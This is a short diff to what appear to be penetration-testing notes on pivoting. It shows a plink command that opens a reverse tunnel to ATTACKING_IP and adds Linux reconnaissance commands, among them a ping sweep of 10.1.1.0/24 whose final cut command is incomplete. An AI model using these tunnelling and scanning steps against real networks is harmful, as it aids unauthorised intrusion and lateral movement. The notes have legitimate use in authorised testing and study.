@@ -60,6 +60,16 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
      puttygen KEYFILE -o OUTPUT_KEY.ppk 
      cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N 
      
-# Scanning Though a pivot 
+# Scanning though a pivot 
 uploading static binaries from [here](https://github.com/andrew-d/static-binaries)  
+
+## Commands 
+
+### Linux 
+
+   arp -a
+   cat /etc/hosts
+   /etc/resolv.conf  
+   
+   for x in {1..254};do (ping -c 1 10.1.1.$x | grep "bytes from" &); done | cut -d " " 
 
